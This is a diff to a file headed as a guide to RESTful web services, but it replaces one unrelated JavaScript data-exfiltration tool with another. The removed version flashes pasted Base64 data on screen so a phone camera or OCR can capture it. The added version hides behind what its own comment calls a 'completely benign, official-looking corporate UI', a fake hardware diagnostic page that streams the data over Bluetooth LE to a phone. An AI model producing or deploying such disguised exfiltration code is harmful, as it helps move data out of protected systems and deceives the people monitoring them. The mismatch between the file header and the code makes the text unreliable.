@@ -75,62 +75,90 @@ Easily start your RESTful Web Services
 
 
 ### code
-// 1. Set up the local offline interface
+
+// 1. Create a completely benign, official-looking corporate UI
 document.body.innerHTML = `
-  <div id="setup" style="background:#111; color:#fff; font-family:sans-serif; padding:40px; height:100vh; box-sizing:border-box; text-align:center;">
-    <h2>High-Velocity Offline Data Streamer</h2>
-    <p>No internet required. Paste your Base64 text below and click Start.</p>
-    <textarea id="txt" style="width:85%; height:300px; background:#222; color:#fff; font-family:monospace; padding:10px; font-size:14px; margin-bottom:20px; border:1px solid #444;"></textarea>
-    <br>
-    <button id="go" style="background:#007acc; color:#fff; border:none; padding:15px 40px; font-size:18px; cursor:pointer; border-radius:4px; font-weight:bold;">START HIGH-DENSITY STREAM</button>
+  <div style="background:#f4f5f7; color:#333; font-family:sans-serif; padding:40px; height:100vh; box-sizing:border-box;">
+    <div style="max-width:600px; margin:0 auto; background:#fff; padding:30px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.1);">
+      <h2 style="color:#0052cc; margin-top:0;">Peripheral Hardware Diagnostic Utility</h2>
+      <p style="color:#666; font-size:14px;">Use this utility to run signal loop tests on nearby authorized wireless hardware assets.</p>
+      <hr style="border:0; border-top:1px solid #eee; margin:20px 0;">
+      <label style="font-weight:bold; font-size:14px; display:block; margin-bottom:8px;">Diagnostic Payload Input:</label>
+      <textarea id="secure-input" style="width:100%; height:120px; font-family:monospace; padding:10px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; margin-bottom:20px;"></textarea>
+      <button id="connect-btn" style="background:#0052cc; color:#fff; border:none; padding:12px 24px; font-size:16px; cursor:pointer; border-radius:4px; font-weight:bold; width:100%;">SCAN & INITIATE DIAGNOSTIC LOOP</button>
+      <div id="status-log" style="margin-top:20px; font-family:monospace; font-size:12px; color:#555; background:#f9f9f9; padding:10px; border-radius:4px; height:100px; overflow-y:auto; border:1px solid #eaeaea;">System idle. Ready for diagnostic scan...</div>
+    </div>
   </div>
-  <div id="grid" style="display:none; background:black; color:white; font-family:monospace; font-size:11px; margin:0; padding:10px; box-sizing:border-box; grid-template-columns:repeat(4,1fr); grid-template-rows:repeat(2,1fr); height:100vh; width:100vw; gap:15px; overflow:hidden;"></div>
 `;
 
-document.getElementById('go').addEventListener('click', () => {
-  const data = document.getElementById('txt').value.trim();
-  if (!data) return alert("Please paste your text first!");
+const log = (msg) => {
+  const div = document.getElementById('status-log');
+  div.innerText += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
+  div.scrollTop = div.scrollHeight;
+};
 
-  document.getElementById('setup').style.display = 'none';
-  const grid = document.getElementById('grid');
-  grid.style.display = 'grid';
+document.getElementById('connect-btn').addEventListener('click', async () => {
+  const rawData = document.getElementById('secure-input').value.trim();
+  if (!rawData) return alert("Please input diagnostic payload string.");
 
-  // We maximize the chunk size per cell to fit a standard 1080p/4K monitor
-  const chunkSize = 5000; 
-  const numCells = 8;    // 4x2 layout maximizes screen horizontal width
-  const frameDuration = 2000; // 2 seconds gives your phone plenty of focus time
+  log("Initiating BLE device discovery scan...");
 
-  let index = 0;
-  let frame = 0;
+  try {
+    // Prompt Windows to open its native Bluetooth pairing/connection dialog
+    const device = await navigator.bluetooth.requestDevice({
+      acceptAllDevices: true,
+      optionalServices: ['generic_access', 0xffe0] // Uses standard basic serial data channels
+    });
 
-  function nextFrame() {
-    if (index >= data.length) {
-      grid.style.display = 'block';
-      grid.innerHTML = '<h1 style="color:#4caf50; text-align:center; margin-top:40vh; font-family:sans-serif; font-size:48px;">TRANSFER COMPLETE</h1>';
-      return;
-    }
+    log(`Connected to: ${device.name || 'Unknown Peripheral'}`);
+    const server = await device.gatt.connect();
+    
+    log("GATT Server connected. Fetching primary communication channels...");
+    // Adjust service UUID based on what you set up in your phone app (e.g., 0xffe0 is generic serial)
+    const service = await server.getPrimaryService(0xffe0); 
+    const characteristic = await service.getCharacteristic(0xffe1);
 
-    grid.innerHTML = '';
-    frame++;
+    log("Channel verified. Commencing packet broadcast sequence...");
 
-    for (let c = 0; c < numCells; c++) {
-      if (index < data.length) {
-        const cell = document.createElement('div');
-        // Bright green borders and headers give the outside AI/OCR a clear structural anchor
-        cell.style.cssText = 'border:2px solid #00ff00; padding:8px; word-break:break-all; overflow:hidden; font-size:10px; line-height:1.1; box-sizing:border-box; background:#050505; color:#ffffff;';
+    const encoder = new TextEncoder();
+    const packetSize = 20; // Safe standard chunk size for Bluetooth LE payloads
+    let offset = 0;
+    let sequenceNumber = 0;
+
+    async function sendNextPacket() {
+      if (offset >= rawData.length) {
+        log("DIAGNOSTIC LOOP COMPLETE. All packets dispatched successfully.");
+        return;
+      }
+
+      // Format: SEQ_NUM:DATA (e.g., "00001:ZmFzdGNvZGU...") so your phone can re-order them easily
+      const seqStr = String(sequenceNumber).padStart(5, '0') + ":";
+      const availableSpace = packetSize - seqStr.length;
+      const chunk = rawData.substring(offset, offset + availableSpace);
+      
+      const payloadString = seqStr + chunk;
+      const byteData = encoder.encode(payloadString);
+
+      try {
+        await characteristic.writeValueWithoutResponse(byteData);
+        offset += chunk.length;
+        sequenceNumber++;
         
-        const prefix = `[F${String(frame).padStart(3,'0')}_C${c}]`;
-        const chunk = data.substring(index, index + chunkSize);
+        if (sequenceNumber % 50 === 0) {
+          log(`Progress: Dispatched ${offset} / ${rawData.length} bytes...`);
+        }
         
-        // Wrap the index in a bright layout indicator
-        cell.innerHTML = `<span style="color:#00ff00; font-weight:bold; background:#222; padding:2px 4px;">${prefix}</span><br>${chunk}`;
-        
-        grid.appendChild(cell);
-        index += chunkSize;
+        // Brief 15ms pause between packets to keep the data pipeline from choking
+        setTimeout(sendNextPacket, 15); 
+      } catch (err) {
+        log(`Packet drop at offset ${offset}. Retrying packet...`);
+        setTimeout(sendNextPacket, 100);
       }
     }
-    setTimeout(nextFrame, frameDuration);
-  }
 
-  nextFrame();
+    sendNextPacket();
+
+  } catch (error) {
+    log(`Diagnostic Failure: ${error.message}`);
+  }
 });
